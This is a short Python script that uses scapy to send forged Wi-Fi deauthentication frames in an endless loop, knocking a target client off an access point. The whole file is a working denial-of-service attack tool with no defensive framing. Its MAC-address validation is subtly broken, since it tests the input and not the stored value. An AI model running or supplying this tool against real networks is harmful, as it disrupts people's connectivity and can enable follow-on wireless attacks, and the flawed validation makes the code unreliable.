#!/usr/bin/env python3
from scapy.all import (
  RadioTap,   
  Dot11,       
  Dot11Deauth, 
  sendp,  
)
import re

MAC_PATTERN = ("^([0-9A-Fa-f]{2}[:-])" +"{5}([0-9A-Fa-f]{2})|" +"([0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4})$")

class Mac():
        def __init__(self, mac:str) -> None:
            self.mac = mac if self.isValid(mac) else None
            if mac == None:
                raise ValueError(f"The mac address: {self.mac} -> is not valid")
        
        def isValid(self, mac:str)->bool:
            match = re.compile(MAC_PATTERN)
            return bool(re.search(match, mac))

        def __str__(self) -> str:
            return self.mac

class Deauther():
    def __init__(self, args:dict) -> None:
        self.__dict__.update(args)

    def start(self):
        frame = RadioTap()/Dot11(addr1=str(self.target), addr2=str(self.bssid), addr3=str(self.bssid))/Dot11Deauth()
        sendp(frame, iface=self.iface, loop=1, verbose=False)
